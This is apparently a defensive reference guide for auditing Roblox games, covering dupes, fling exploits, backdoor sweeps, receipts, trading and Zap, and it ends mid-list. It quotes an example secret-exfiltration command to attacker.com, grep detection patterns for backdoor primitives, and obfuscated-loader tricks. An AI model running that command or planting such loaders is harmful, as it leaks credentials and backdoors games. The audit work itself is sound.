# Roblox OpSec — Reference Material

Deep-dives, taxonomies, and full mitigation playbooks for the threat categories indexed in `SKILL.md`. Read the section that matches the audit you're running; do not read this file end-to-end unless surveying.

## Index

1. [Cross-server dup](#cross-server-dup) — every dup vector that crosses a server boundary
2. [Network ownership / fling exploits](#network-ownership) — the full fling/ram taxonomy and mitigations
3. [Obfuscated loaders](#obfuscated-loaders) — every way `require` / `loadstring` ids get hidden in shipped backdoors
4. [Backdoor audit procedure](#backdoor-audit) — concrete grep patterns and sweep methodology
5. [Off-screen / whitespace payloads](#whitespace-payloads) — visual-hiding attacks and detection
6. [Unreliable remotes](#unreliable-remotes) — the full transport-level threat model
7. [Trading systems](#trading-systems) — anti-scam patterns and the canonical trade flow
8. [ProcessReceipt edge cases](#process-receipt) — every way the canonical pattern gets broken
9. [Lag-compensated hit detection](#lag-compensation) — implementing server-side combat without unfair kills
10. [Open Cloud / external pipelines](#open-cloud) — key scoping, rotation, CI hygiene
11. [Studio plugin supply chain](#studio-plugins) — how plugins compromise place files
12. [Animation / HumanoidDescription exploits](#animation) — rig-displacement and accessory-griefing
13. [Anomaly detection / banwave evidence](#banwave) — what to log and how to act on it
14. [Zap (red-blox)](#zap) — full audit playbook for Zap-using codebases

---

## Cross-server dup

The single most-shipped class of bug in Roblox economy code. Every action that consumes, transfers, or ledger-mutates an item must be analysed against this scenario:

> Player joins server A, performs the action, immediately teleports / rejoins server B, and performs the same action with the same item *before* server A's DataStore write commits.

If both servers can succeed, you have a dup. The attacker iterates this loop with a script that auto-rejoins on a faster cadence than your save interval.

### Core fix triad

1. **Session-locked persistence.** ProfileStore (or ProfileService) holds an exclusive lease on the profile key. Server B refuses to load until A's lease expires or is explicitly released. *Treat any "another server holds the lock" load failure as kick — never let the player play on a stale snapshot.*
2. **Debit-then-grant ordering.** Write the consume *before* the credit, both in DataStore terms and in in-memory state. Even if the credit fails, the consume is durable. Reverse order = inventory created from thin air on credit-failure-with-debit-success races.
3. **Idempotency on every grant.** Each grant carries a unique action id; replaying the action with the same id is a no-op. Without this, retry logic creates dupes.

### Variants to also walk through

- **Trades held open across a teleport.** A and B open a trade. A teleports mid-trade. The trade either auto-cancels (correct) or A's items are debited but B's credit can't fire because A is no longer in the server (dup or vanish). Force-cancel any open trade on `PlayerRemoving` *before* the profile saves.
- **MessagingService-based cross-server trades / markets.** Dup factories without a single-writer authority. The pattern that works: a designated broker server holds both ProfileStore leases, performs the swap, releases both. The pattern that doesn't: each server optimistically debits its own player and trusts the other to credit.
- **Mutated `TeleportData` payloads.** Player carries inventory in `TeleportData`. Exploiter modifies the payload before joining the destination server. Destination trusts it = inventory injection. Fix: TeleportData carries only an opaque token; destination re-fetches from DataStore/MemoryStore.
- **Reserved-server keying.** Joining a reserved server with a mutated payload to instantiate "premium" state. Re-validate everything server-side at load.
- **Optimistic global leaderboards / shared economies** updated without `UpdateAsync` → lost-update races silently delete entries and award the slot multiple times.
- **Shared-key economies** (e.g. trading-post listings) without a per-listing lock → two buyers both succeed on the same listing.
- **`PlayerRemoving` race.** The player teleports; `PlayerRemoving` fires, save begins. The save takes 200ms. The player is already loaded into server B with the *previous* snapshot. ProfileStore handles this correctly via lease release; rolling your own does not.

### Daily / login / timed reward replay

If "claim daily" checks `os.time() - lastClaim > 86400` from in-memory state without a session-locked persistent write, the player can claim in server A, hop to a fresh server B (which loads pre-claim state if A hasn't saved yet), and claim again. Same lease + idempotency rules apply. The persistent write of `lastClaim` must commit before the in-memory grant fires, gated by lease ownership.

### Red flags during code review

- Any `PlayerRemoving` handler that does *all* the saving (no autosave, no explicit save-after-grant)
- Any debit/credit pair separated by a yield (`task.wait`, `:UpdateAsync`, anything that yields between debit and credit)
- Any "global state" table mutated by remotes that's never persisted with a lock
- Any DataStore key that is `Player_<UserId>` without a profile lease pattern around it
- "I'll add session locking later, the dup window is small" — this is the exact bug. The window is your mean save latency, which is hundreds of ms, which is forever for a script

---

## Network ownership

By default Roblox auto-assigns network ownership of a player's character assembly to that player's client — meaning the owning client's physics simulation is *authoritative* for that assembly and replicates to everyone else.

### The fling primitive

An exploiter exploits ownership by yanking their own HRP (`CFrame`, `AssemblyLinearVelocity`, `ApplyImpulse`, or just teleport-loops at >1000 studs/frame) into another player's character. Because their client owns the collision math, the victim is flung across the map / into the void / through walls — sometimes hard enough to kill on landing.

### Variants

- **Mass welding.** Welding a massive invisible part to your character so any touch transfers huge momentum.
- **Vehicle-seat ownership seizure.** Sitting in a `VehicleSeat` to grab ownership of the whole assembly and ram with it.
- **Tool-handle swings.** You own equipped tool parts; swinging one through other characters transfers velocity.
- **Closest-player ownership inheritance.** Any unanchored part you can reach: `SetNetworkOwner` defaults to "closest player" when not explicitly set, so loose props can be hijacked simply by walking near them.
- **Network-ownership reassignment.** When two assemblies touch, Roblox can reassign ownership; an attacker bumps your server-owned vehicle, takes ownership, then flings it.

### Mitigation playbook (in priority order)

1. **Never trust client-owned positions for combat or damage.** Do hit detection server-side (see [Lag compensation](#lag-compensation)).
2. **For high-stakes assemblies — boss enemies, vehicles in PvP, currency-bearing pickups, anything that mustn't be flung — call `part:SetNetworkOwner(nil)` so the server owns physics.** Accept the latency cost; the alternative is letting a single player ram them off the map.
3. **Server-side anti-fling pass on character HRPs each Heartbeat.** Clamp `AssemblyLinearVelocity.Magnitude` to a sane ceiling (e.g. 150) and snap-correct any per-tick position delta beyond the speed/teleport budget. Same loop as the speed detector in `SKILL.md` Hardening, but it *acts* (rubber-band the HRP back) rather than just warning.
4. **Server-side enumerate `BodyMover`s / `Constraint`s parented under any character and destroy any the server didn't author.** Walk the descendants on character spawn and again periodically; tag server-authored ones with an attribute.
5. **Re-assert ownership on assembly changes for parts that must stay server-owned.** `SetNetworkOwner` is purely advisory — Roblox can reassign when assemblies touch or when the previous owner disconnects. Hook `GetNetworkOwnershipAuto` and `Touched`/`AssemblyChanged` to reinstate.

### What doesn't work

- "I'll detect flings and rubber-band the victim back" — by the time you detect, the victim is already in the void.
- "Anchor everything" — breaks gameplay; isn't a fix for vehicles or moving NPCs.
- Trusting `SetNetworkOwner(nil)` once at part creation — assembly merges silently re-grant ownership.

---

## Obfuscated loaders

Backdoor authors know `rg "require\(\d+\)"` is the first thing an auditor runs, so the literal numeric id is almost never present in modern shipped backdoors. Instead the id is **reconstructed at runtime** from innocuous-looking pieces.

### Reflexively flag any of

- A number passed to `require` / `loadstring` / `InsertService:LoadAsset` that isn't a literal int written inline.
- `tonumber` of a string built by `..` concatenation, `table.concat`, `string.format`, or `string.rep`.
- `string.char(...)` sequences whose decoded bytes are ASCII digits (`string.char(49,50,51,...)` → `"123..."`).
- Arithmetic that looks artificial: `require(1234567 * 1000 + 890)`, `require(0x4D2 + 0x10E)`, `require(bit32.bxor(...))`, `require(math.floor(1.234e9))`.
- Decoded base64 / hex / `HttpService:JSONDecode` blobs producing a number.
- Lookup tables of "random" numbers where one entry is summed/xor'd into the asset id (`require(IDS[1] + IDS[2] - IDS[3])`).
- Ids fetched from `Attribute` / `StringValue` / `script.Source` / `script:GetAttribute` at load time.
- Ids built from `Instance.Name`s of seemingly cosmetic parts: `require(tonumber(workspace.Decor.Rock_1234567890.Name:match("%d+")))`.
- Ids assembled across modules (`require(M1.a * 1e6 + M2.b)`) so no single file shows the smoking gun.
- `require` whose argument is a *function call* (`require(getId())`, `require(decode(blob))`).

A clean codebase requires modules by direct ModuleScript reference (`require(script.Parent.Foo)` / `require(ReplicatedStorage.Shared.Foo)`), never by computed number. **Any computed-or-decoded value reaching `require`, `loadstring`, `InsertService:LoadAsset`, `MarketplaceService:GetProductInfo`, or `HttpService:GetAsync` is a backdoor until proven otherwise.** Diff against a clean copy of the model if one exists, and when in doubt, delete and reimplement rather than try to "clean" it.

### Same suspicion applies to URLs

A URL assembled from `string.char` / base64 / concatenated halves is exfiltrating data to an attacker-controlled endpoint. Allowlist exact URLs as literal strings; flag anything else.

---

## Backdoor audit

### Where the obfuscated payload hides

Backdoors rarely live in `Script`s named `Backdoor`. Sweep for:

- Scripts parented to props, decals, meshes, terrain models, particle effects, or anything that shouldn't contain code.
- `LocalScript` / `ModuleScript` instances disabled-then-re-enabled at runtime.
- Scripts with names that mimic Roblox internals (`Animate`, `Sound`, `RbxUtility`, `CoreGui`).
- Modules `require`d from `_G`, `shared`, or a global set during `RunService.Heartbeat:Wait()` so the call site is decoupled from the load site.
- Any `script.Source` / `script:GetChildren()` traversal that concatenates a number out of child names or attributes.
- Treat `_G`, `shared`, and `getfenv()` / `setfenv()` writes in third-party code as load-bearing red flags.

### Sweep methodology

Run these passes, in order, on a fresh check-out of the place file:

1. **Enumerate every `Script` / `LocalScript` / `ModuleScript`** in the place. For each, record name, ClassName, parent path, and `Disabled` state. Anything parented outside the standard service tree (`ServerScriptService`, `ServerStorage`, `ReplicatedStorage`, `ReplicatedFirst`, `StarterPlayer*`, `StarterGui`, `StarterPack`) is suspect.
2. **`rg -P 'require\s*\(\s*\d'`** — literal numeric requires. Should be empty in your code (you only require ModuleScripts).
3. **`rg -P 'require\s*\([^)]*(\.\.|tonumber|string\.char|table\.concat|HttpService|GetAttribute|getfenv|_G|shared)'`** — computed requires.
4. **`rg -P '(loadstring|setfenv|getfenv|_G\s*\[|shared\s*\[)'`** — backdoor primitives.
5. **`rg -P 'HttpService:(Get|Post|Request)Async'`** — list every HTTP call. Each URL must be a literal string.
6. **`rg -P 'InsertService:Load'`** — any LoadAsset/LoadAssetVersion is suspect unless it's an asset you own.
7. **`rg -P '.{500,}'`** — long lines, see [Whitespace payloads](#whitespace-payloads).
8. **`rg -P '[\x{00A0}\x{2028}\x{2029}\x{200B}-\x{200F}\x{202E}\x{FEFF}]'`** — non-ASCII whitespace and bidi controls. Bidi-overrides (`U+202E`) are an instant reject; the others are at minimum a manual review.
9. **Search by hash.** If you suspect a known-bad free model, hash the script source and compare against community blocklists.

### Triage

- Found `_G.x = function() ... end` in a third-party module that's executed at load? Treat as confirmed backdoor.
- Found a `require` of a moduleId you don't own? Confirmed.
- Found `loadstring` enabled? Confirmed.
- Found suspicious-looking but functionally inert code in a free model? **Delete the whole free model and reimplement.** "Cleaning" is unreliable; you'll miss a callsite.

---

## Whitespace payloads

A classic free-model trick: take a benign-looking line like `local x = 1` and append hundreds of spaces or tabs followed by the real payload (`require(1234567)`, `loadstring(...)`, a webhook POST). In Studio's script editor — and in most diff viewers — the malicious tail is shoved past the visible viewport, requires horizontal scrolling to find, and is invisible in casual review.

### Variants

- Payload hidden after a long run of tabs.
- Payload after a `--` comment line that's actually `-- <300 spaces> \n<payload>` exploiting line-wrap behaviour.
- Unicode whitespace that doesn't render but isn't matched by `\s` in every tool: `U+00A0` no-break space, `U+2028` line-separator, `U+2029` paragraph-separator, `U+200B`/`200C`/`200D` zero-width, `U+FEFF` BOM.
- Single ~10,000-char line so the editor truncates display.
- Bidi-override (`U+202E`) reversing the visual order of a literal so `require("evil")` *looks* like `require("good")` when read left-to-right.

### Audit procedure

Before reviewing *any* third-party Luau:

1. Enable word-wrap in your editor.
2. Enable show-invisibles / render-whitespace.
3. Run `rg '.{200,}' <path>` over every script in the place file to surface long lines.
4. Run `rg -P '[\x{00A0}\x{2028}\x{2029}\x{200B}-\x{200F}\x{202E}\x{FEFF}]' <path>` to catch non-ASCII whitespace and bidi/zero-width characters.
5. Treat *any* line over a couple hundred characters in human-authored Luau as suspect until you've read it end-to-end.
6. Bidi-override characters deserve an instant reject — there is no legitimate reason for them in source code.

---

## Unreliable remotes

The "unreliable" in `UnreliableRemoteEvent` is a UDP-style transport guarantee: packets can be **dropped, reordered, or duplicated**, and Roblox makes no promise that `OnServerEvent` fires in the same order the client called `:FireServer`. The client controls its own network stack, so an exploiter can deliberately reorder, withhold, replay, or burst packets — and you cannot tell "natural reorder/loss" apart from "crafted reorder/loss" on the receiving side.

### Concrete exploits to reflexively check for

**(a) State-machine skips and inversions.** Any unreliable remote that's part of a sequence (`startCharge → tickCharge → releaseShot`, `beginCombo → comboStep → comboFinish`, `enterZone → zoneTick → exitZone`) can have its steps arrive in any order or with steps missing entirely. If the server processes `releaseShot` before `startCharge`, or honours `exitZone` before the matching `enterZone`, you have a bug. **Sensitive sequencing must run on a reliable RemoteEvent, period** — unreliables are for fire-and-forget cosmetic/positional streams only.

**(b) Selective drop of disadvantageous ticks.** If the unreliable carries player-reported telemetry (input frames, "I'm taking fall damage", "I stepped on lava", regen ticks, stamina drain), the exploiter drops the packets that hurt them and keeps the ones that help. The server, expecting "best-effort", has no missing-packet alarm to fire. Anything that *debits* the player must never live on an unreliable channel.

**(c) Replay and burst.** Nothing in the transport rejects a duplicated packet, and `:FireServer` can be called in a tight loop. If the handler is idempotent-by-luck rather than by design (e.g. "increment combo counter", "apply tick of poison to target", "add 1 to score"), each replay grants. Apply the same once-per-X / nonce / server-authoritative-counter rules as the triage cardinality question — *more* strictly, because the transport actively encourages duplicates.

**(d) Out-of-order "last writer wins" inversions.** For streams of position/look/aim updates, an old packet arriving after a new one will silently rewind server state if you blindly assign `lastKnownPos = payload.pos`. Stamp every unreliable payload with a monotonic client sequence number *and* validate it server-side: `if seq <= lastSeq[player] then drop end`. The seq itself is client-supplied so it's not trustworthy for anything but ordering — never use it as a nonce for grants.

**(e) Spoofed "I missed a tick" recovery.** If your protocol is "client occasionally sends a catch-up packet listing the last N states", the exploiter sends a catch-up that backfills favourable history. Treat catch-up packets with the same suspicion as any other client claim.

### Bottom line

Unreliable remotes are a *replication-cost* optimisation, not a security tier. Use them for cosmetic VFX triggers, non-authoritative position hints for ESP-irrelevant entities, and chat-typing indicators. **Never** for damage, currency, inventory, state transitions, prompt confirmations, purchase flows, or any counter the server respects. If you find an unreliable remote in a sensitive path during audit, the finding is: *"convert to RemoteEvent and add the standard validation/rate-limit/sequence-state checks; unreliable transport is incompatible with this contract."*

---

## Trading systems

Trading is one of the highest-leverage exploit surfaces in Roblox. A single dup video gets millions of views and can collapse an economy in days.

### Canonical flow

```
1. requestTrade(targetUserId)
   - server: validate target online, not in trade, not in cooldown
   - server: open trade session in TradeSessions[sessionId] = {
       players = {a, b}, offers = {[a] = {}, [b] = {}}, locked = false, version = 0
     }
2. offerItems(sessionId, itemIds)
   - server: re-resolve every itemId against ProfileStore for the calling player
   - server: refuse if locked
   - server: increment version; broadcast version to both clients
3. acceptTrade(sessionId, expectedVersion)
   - server: refuse if version mismatch (offer changed since you saw it)
   - server: mark this player accepted
   - server: when both accepted → snapshot offers, set locked=true, refuse mutations
4. commitTrade(sessionId)
   - server: acquire both ProfileStore leases
   - server: validate every snapshot item is still owned by the offering player
   - server: in a single atomic operation: debit both, credit both
   - server: release leases, close session, log
```

### Anti-patterns to refuse on sight

- Trade state stored in a `BindableEvent`-shared table without locks
- "Accept" flag computed on the client and sent as `acceptTrade(true)`
- Item IDs accepted from the client at commit time (must re-resolve from ProfileStore at lock time)
- Commit happens player-by-player rather than atomic
- No `PlayerRemoving` cancel hook — partner-disconnect dup
- No `version` on offer mutations — stale-offer Accept races
- Inventory queryable as "tradeable" via *non-trade* remotes during an open trade — out-of-trade modification

### Logging contract

Every completed trade logs: timestamp, sessionId, both UserIds, both offer snapshots (item ids + computed values), commit result. Players accuse you of allowing scams whether or not they happened; without logs you can't moderate.

### Cross-server trades

Default position: forbid. If you must:

- Designate a single broker server per trade (e.g. lowest-jobId among the place's MessagingService participants).
- Broker holds both ProfileStore leases simultaneously. If a lease is unavailable, refuse.
- Broker performs the swap atomically, releases both.
- All other servers reject any "trade commit" message that doesn't come from the elected broker for that session.

---

## Process receipt

`MarketplaceService.ProcessReceipt` is the *only* legitimate place to grant a paid item. Violating that means anyone can fake a purchase or get extras of a real one.

### The non-negotiable rules

1. **`ProcessReceipt` is the single award point.** Never grant from `PromptProductPurchaseFinished`, `PromptPurchaseFinished`, or any client-side callback.
2. **Idempotent via receipt id.** The same `info.PurchaseId` arriving twice grants exactly once.
3. **Grant before returning `PurchaseGranted`.** If the grant fails, return `NotProcessedYet` so Roblox retries.
4. **Side-effect-free `UpdateAsync` transform.** Roblox re-runs the transform on transaction conflict. Anything inside it that has side effects (calling `grantItem`, firing remotes, writing other DataStores) will run multiple times.
5. **Idempotent `grantItem` itself.** Defence in depth — even though the receipt dedup catches replays, a robust `grantItem` is invariant under repeated calls with the same product id within the same receipt context.

### Pattern (also in `SKILL.md` Hardening)

The `wasNew` flag is the trick — the transform records the receipt and returns whether this call was the first writer. Outside the transform, `grantItem` fires only when `wasNew` is true. Conflict-induced re-runs of the transform set `wasNew = false` because the record now exists, so `grantItem` never double-fires.

### Failure cases to test

- DataStore down at receipt time → return `NotProcessedYet`, Roblox retries on next session.
- Player leaves before grant lands → return `NotProcessedYet`; the next time they join, `ProcessReceipt` re-fires for the unprocessed receipt.
- Two server instances both see the receipt (rare; can happen on cross-server purchase) → `UpdateAsync` arbitrates; one sees `prev = nil` and grants, the other sees the existing record and skips.
- The grant action itself yields and fails halfway → ideally `grantItem` is also idempotent on its own data writes; if it can't be, accept that some receipts may need manual reconciliation and log loudly.

### Anti-patterns

- `grantItem(player, info.ProductId); return PurchaseGranted` (no dedup) — every retry grants again.
- Granting inside the `UpdateAsync` transform — conflict re-run grants again.
- Returning `PurchaseGranted` before the grant write commits — losing the grant on crash, player paid for nothing.
- Storing receipts in the player's main profile rather than a dedicated `Receipts` store — hard to dedup across sessions, and you'll lose receipts when you wipe profiles.

---

## Lag compensation

Server-side hit detection without lag compensation feels broken to players ("I clearly hit them!"). With it, you get accurate hits without trusting the client to compute them.

### Pattern

1. Every Heartbeat, snapshot every player's `HumanoidRootPart.CFrame` into a per-player ring buffer keyed by server time. Keep ~500ms of history.
2. When a client fires "I shot at this aim direction at server-time T":
   - Estimate the attacker's effective ping (from `Player:GetNetworkPing()` × 2, capped at ~250ms).
   - Rewind the *targets* (not the attacker) to their position `ping` ago.
   - Raycast from the attacker's *current* HRP using the client-supplied aim direction.
   - If the ray hits a target's rewound hitbox, register the hit.
3. Apply damage server-side. Never trust client damage value.

### What to validate before accepting the shot

- Aim direction is normalised, finite, and not absurd (`magnitude == 1 ± epsilon`).
- Time `T` is within a reasonable window (`now - 250ms < T < now + 50ms`).
- Attacker is alive, in the right team / state, has the weapon equipped (`tool.Parent == player.Character`).
- Weapon's per-shot cooldown has elapsed on the server's clock.
- Attacker has line-of-sight from their current HRP through the aim direction (no shooting through walls).

### What not to do

- Use the client's reported hit position to apply damage. Re-derive from the raycast.
- Trust the client's reported attacker position. The attacker's position is what the server sees on its own Heartbeat tick.
- Rewind beyond ~250ms. Honest pings are below this; rewinding further enables shoot-through-walls-into-the-past attacks.

---

## Open Cloud

Open Cloud (DataStores, MessagingService, Place Publishing, OpenCloud Auth) is a parallel attack surface that lives outside the Roblox runtime — and a leaked key is a total compromise.

### Key hygiene

- **Scope every key** to the minimum endpoints (specific datastore names, specific universes, specific operations). The default "all access" key is for emergency console use only and should not exist long-term.
- **Rotate quarterly**, and immediately on suspected compromise. The key is bearer-only; there's no fingerprint-based revocation.
- **Never log keys.** Not in `print`, not in error messages, not in CI logs, not in monitoring tools. Mask in any output.
- **Per-environment keys.** Production, staging, and dev each have separate keys with separate scopes.
- **CI keys are read-only by default.** Granting write scope to CI means a compromised PR or workflow can wipe live data.

### CI / GitHub Actions specifics

- Store keys in repository secrets, never in code or workflow YAML.
- Restrict secrets to specific branches and protected environments.
- Audit which workflows have access to the key. Every PR's workflow inherits secrets unless you scope them; an attacker's PR can exfiltrate them via `echo $SECRET | base64 | curl attacker.com`.
- Use fork-aware secret protection (GitHub disables secrets for PRs from forks by default — keep it that way).

### External app integration

- Apps using OAuth to sign in users get a UserId — trust that for identity, treat everything else (display name, avatar URL, group membership) as advisory and re-fetch from your own trusted server.
- Never accept "I am UserId X" claims from the client for app-to-game data flow without an OAuth-verified token.

---

## Studio plugins

Plugins run with full Studio permissions: edit place files, inject scripts, read/write user settings, make HTTP requests (if allowed). A malicious plugin can backdoor every place you open while installed.

### Audit plugins like free models

- Source view in Studio: enumerate every `Script`/`ModuleScript`/`LocalScript` in the plugin and apply the [Backdoor audit](#backdoor-audit) procedure.
- Disable "Allow HTTP Requests" for any third-party plugin until you've reviewed its outbound traffic.
- Prefer plugins that are open-source, where you can audit the published source against the installed version.
- Plugin updates can change behaviour silently; pin to specific versions where possible, re-audit on update.

### Specific red flags

- Plugin reads/writes `plugin:GetSetting` for keys that look like API tokens.
- Plugin makes HTTP requests to non-author domains.
- Plugin injects ModuleScripts into your place on save.
- Plugin reads `script.Source` of arbitrary scripts in the open place.

---

## Animation

The `Animate` LocalScript inside characters is client-controlled and trivially replaceable.

### Common exploits

- **Custom hitbox via animation rig manipulation.** Replacing `Animate` with a script that scales limbs or rotates the rig to expose hitboxes that wouldn't otherwise be reachable. Server-side hitbox queries that test against the *visible character mesh* will register hits on the manipulated rig.
- **Head-throw "fly".** Animation that detaches the head/HRP from the rest of the body so the body collides with the world but the HRP travels freely.
- **Aim-assist via rig snapping.** Custom `Animate` that subtly aims at the nearest enemy each frame.
- **Oversized R6/R15 limbs for shield griefing.** Massive arms/legs that block sightlines or push other players.

### Mitigations

- Server-side hit detection uses `HumanoidRootPart` position and a server-authoritative hitbox shape (sphere/capsule), **not** the actual rendered mesh.
- Whitelist `AnimationId`s server-side. Maintain a list of allowed ids per character class; reject `:LoadAnimation` for anything else.
- On character spawn, replace the default `Animate` with a server-pinned version (parent it server-side after `CharacterAdded`, mark it server-authored).
- Cap `HumanoidDescription` accessory dimensions on apply: enumerate accessories on character spawn, measure their bounding boxes, remove anything beyond gameplay-reasonable size.

### HumanoidDescription specifics

- `HumanoidDescription:ApplyDescription` from a client-supplied description = arbitrary accessory swap. The server applies descriptions; reject and revert client-applied ones.
- Body-part scale (`HeadScale`, `BodyTypeScale`, `BodyDepthScale`, etc.) is gameplay-relevant in physics-based games. Pin server-side.

---

## Banwave

Real-time bans are noisy and tip exploiters off to your detection. **Banwaves** — accumulated evidence acted on in batches — are quieter, scarier, and harder to evade.

### What to log per player session

- Failed validation count per remote per minute (rolling).
- Rate-limit hits per remote.
- Magnitude outliers (speed, damage, currency-per-action).
- Honeypot fires (any wrong-direction traffic on `S→C` remotes).
- Suspicious Instance args (Instances from outside expected containers).
- DataStore retry/conflict patterns (server-hopping shows up here).
- Trade pattern anomalies (rapid trades with same partner, item value mismatches above threshold).

### Storage

- Push to an external sink (HTTP webhook to your own backend, Open Cloud DataStore in a dedicated "telemetry" universe, or third-party log service).
- Don't log to per-player profile DataStore — too small a quota, and you don't want to lose evidence on profile wipe.
- Store enough to reconstruct the session: timestamp, server jobId, placeId, full event payload.

### Acting on evidence

- **Real-time auto-kick** for unambiguous signals (honeypot fire, `loadstring` execution, computed `require` arg, position teleport >> max speed).
- **Anomaly score accumulation** for soft signals; thresholds trigger soft-kick (rejoin allowed) → temp-ban → permaban escalation.
- **Banwave application.** Batch evidence over a week; ban via `BanService` (modern; uses IP/HWID where available) or `Players:BanAsync` in one push. Exploiters lose access between iterations of their dev cycle, can't pinpoint the detection vector.
- **Don't tell them why.** Generic "you have been banned for cheating" is enough. Don't say "your speed exceeded 50" — they'll just slow down.

### What not to do

- Show a "Suspicion: 0.8/1.0" UI to the client (you'd be amazed how often this ships).
- Kick the moment a single anomaly fires — they'll iterate around it instantly.
- Ban by username — names can be changed; ban by UserId.
- Use `Player:Kick(reason)` with a reason that explains the detection.

---

## Zap

[Zap](https://zap.redblox.dev) (red-blox) is a Rust-built code generator that compiles a `.zap` IDL into `server/output.luau` + `client/output.luau`, packing arguments into buffers under a single `RemoteEvent` / `UnreliableRemoteEvent` pair. It is the recommended typed-remotes framework when bandwidth or schema discipline matters — but Zap layers schema validation on top of `RemoteEvent`, it does not replace any of the threats in §Remote-event abuse, §Economy, §Trading, §Replication boundary, §Rate limiting, §UnreliableRemoteEvent. Audit Zap-using code with the same nine-question workflow; this section adds the Zap-specific layer on top.

This deep-dive is for `0.6.x` (the maintained branch as of v0.6.28; a rewrite is in progress on the `rewrite` branch).

### 1. Recognition fingerprints

Run any of these to detect Zap usage in a codebase:

- File extension `.zap` anywhere in the repo (the IDL source).
- Generated files containing the header `-- This file was generated by Zap` and `-- Stable Version: 0.6.x`.
- `ReplicatedStorage.ZAP` folder, or `ZAP_RELIABLE` / `ZAP_UNRELIABLE` `RemoteEvent` / `UnreliableRemoteEvent` (default names; can be renamed via `remote_scope` / `remote_folder`).
- `require(...).<EventName>.SetCallback`, `.On`, `.Fire`, `.FireAll`, `.FireExcept`, `.FireList`, `.FireSet`, `.Call`, `.SendEvents` calls in Lua / TS.
- Pasted IDL: `event Foo = { from: ..., type: ..., call: ..., data: ... }`, `funct Bar = { call: ..., args: ..., rets: ... }`, `struct`, `enum "tag" { ... }`, `unknown`, `Instance.Player`, `AlignedCFrame`, `string.utf8 (..N)`.
- Tooling: `aftman.toml` containing `red-blox/zap = "..."`, the [Zappy Studio plugin](https://github.com/Ultrasonic1209/Zappy/), or a CI step running `zap path/to/config.zap`.

When Zap is present, these are the audit deliverables:

1. The `.zap` config (options + every event + every funct + every type).
2. The placement of `server/output.luau` and `client/output.luau` in the place tree (Rojo project file or in-Studio location).
3. Every `SetCallback` / `On` / `Fire*` / `Call` callsite.
4. The CI/build pipeline that regenerates the outputs.
5. The Zap CLI version (or Zappy plugin version) in use.

### 2. Option-by-option audit

Cross-reference against the [official options docs](https://zap.redblox.dev/config/options.html). Each option's audit weight:

- **`server_output` / `client_output`.** Audit the path. **Server output must land in `ServerStorage` or `ServerScriptService` only** — anywhere replicated leaks the entire server-side handler signature surface. Client output anywhere replicated is fine; treat it as fully public.
- **`types_output`.** Cosmetic / Luau type ergonomics. No security weight unless the path is wrong (e.g. a server-only types file replicated).
- **`call_default`.** If set to `ManySync` / `SingleSync`, every event without an explicit `call:` becomes a sync handler — silent yield UB and silent error packet drops apply to the whole config. Prefer `ManyAsync` as the default; require explicit `Sync` opt-in per event.
- **`remote_scope`.** Renames `ZAP_RELIABLE` / `ZAP_UNRELIABLE`. **Not security** — exploiters enumerate `ReplicatedStorage:GetChildren()` recursively; the rename only stops naive script-injectors hardcoded to literal names.
- **`remote_folder`.** Renames the `ZAP` folder. Same caveat as `remote_scope`. Useful only as defense-in-depth.
- **`casing`.** Cosmetic.
- **`write_checks`.** `true` (default) checks ranges/lengths/etc. on the **send** side. **Disabling in production saves a few µs per send but means server code can fire schema-violating data**, which the receiving client silently fails to deserialize and drops the whole batch — a hard-to-trace data-loss footgun. Keep `true` unless you have a parallel server-side validation pass and benchmark proof you need the cycles.
- **`typescript`.** No security weight per se; just verify TS types stay in sync with Luau.
- **`manual_event_loop`.** When `true`, you must call `Zap.SendEvents()` yourself. **Use this to defang issue #219 partially** by clamping send rate to ≤60 Hz (see snippet in options docs); also lets you batch-flush before destroying replicated `Instance` args. Audit: if `manual_event_loop = true`, find the `SendEvents` call and verify it's hooked to a periodic dispatcher (Heartbeat-with-timer, RunService.PostSimulation, etc.). A `manual_event_loop = true` config with no `SendEvents()` callsite means **no events are being sent at all** — silent breakage.
- **`include_profile_labels`.** `true` adds microprofiler labels to the generated file. Disable in production builds — bloats binary, leaks internal Zap version/build info into client.
- **`typescript_max_tuple_length`.** Cosmetic.
- **`typescript_enum`.** Audit: if `ConstEnum` (numeric variant) is used, the Luau output accepts numbers instead of strings. A handler that does `if status == "Starting" then` becomes a permanent dead branch — quietly broken. Prefer `StringLiteral` (default) or `StringConstEnum`.
- **`yield_type`.** `"yield"` (default) blocks the calling thread on `Call`. `"future"` / `"promise"` return a future/promise. No security weight, but verify any `Call` site handles the chosen mode (a forgotten `:Await()` on a Promise = silent fire-and-forget that leaks "I expected a return value").
- **`async_lib`.** Required when `yield_type ≠ "yield"`. Verify the `require(...)` path is a literal (NOT `require(<computed>)` — see §Backdoors) and points at a vendored / pinned promise/future library.
- **`tooling` / `tooling_output`.** Generates a public deserializer module that hands a one-call packet inspector to anyone who can `require` it. **Only enable behind a build flag; never ship to production.** If `tooling = true` is committed, escalate.
- **`tooling_show_internal_data`.** Adds extra debug fields. Same — debug only.
- **`disable_fire_all`.** `true` removes the `.FireAll` method from server output. Flip on if the config has no event that legitimately needs `FireAll` — closes the "accidentally broadcast per-player payload to everyone" footgun (the highest-blast-radius mistake possible with Zap, since every event is one `.FireAll` typo away from broadcasting any player's data to all sockets).

### 3. `event` field audit

Each declared event has four fields (`from`, `type`, `call`, `data`). Walk every event:

- **`from: Server`** — server can `Fire` / `FireAll` / `FireExcept` / `FireList` / `FireSet`; client has only `On` / `SetCallback`. Audit each Fire site for §Replication boundary leakage (ESP data, other players' inventory, anti-cheat thresholds in the payload). Audit each client handler for trust placement (does the client treat the payload as authoritative for any decision? It must not — server is truth).
- **`from: Client`** — client has `Fire`; server has `On` / `SetCallback`. **This is the §Remote-event abuse surface**: every nine-question check applies. Zap's schema only validates types; everything else (rate, replay, state-machine, ownership) is your code.
- **`type: Reliable`** — guaranteed in-order delivery. Default for anything that mutates server state or carries state-machine transitions.
- **`type: Unreliable`** — UDP-style, plus a **1000-byte hard cap** (Zap throws on overflow). All §UnreliableRemoteEvent rules apply. **Never** carry sequencing, debits, grants, or single-use tokens on `Unreliable`. Audit each `Unreliable` event's payload size: if a struct could grow past 1000 bytes (e.g. an array with no upper bound), the server-fire path can be tickled into erroring.
- **`call: ManyAsync`** — recommended default. Multiple `On` handlers, called via `task.spawn`. Yielding fine.
- **`call: ManySync`** — multiple `On` handlers called inline; **yielding causes undefined and game-breaking behavior, errors silently drop the packet**. Use only on trivial pure-validation paths. Audit: confirm no `task.wait`, no `:GetAsync`, no `pcall` of a yielding API anywhere in the handler chain.
